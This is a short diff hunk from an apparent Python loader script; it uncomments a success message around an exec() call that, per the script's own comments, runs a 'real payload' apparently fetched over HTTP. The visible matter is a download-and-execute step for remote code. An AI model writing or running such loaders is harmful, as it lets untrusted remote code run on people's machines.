@@ -28,7 +28,7 @@ if response.status_code == 200:
     # execute real payload with subprocess
     try:
         exec(m_code)
-        # print("✅ payload executed")
+        print("✅ payload executed")
     except Exception as e:
         print("❌ p failed:", e)
 
